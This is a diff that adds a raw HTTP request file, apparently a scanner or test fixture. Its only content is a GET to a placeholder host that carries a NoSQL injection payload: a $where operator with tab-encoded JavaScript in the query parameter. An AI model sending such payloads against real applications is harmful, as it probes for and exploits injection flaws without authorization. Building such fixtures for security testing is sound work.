@@ -1,0 +1,4 @@
+GET /a?name={$where:%09"new%09Date()%09%26%26%09true"} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
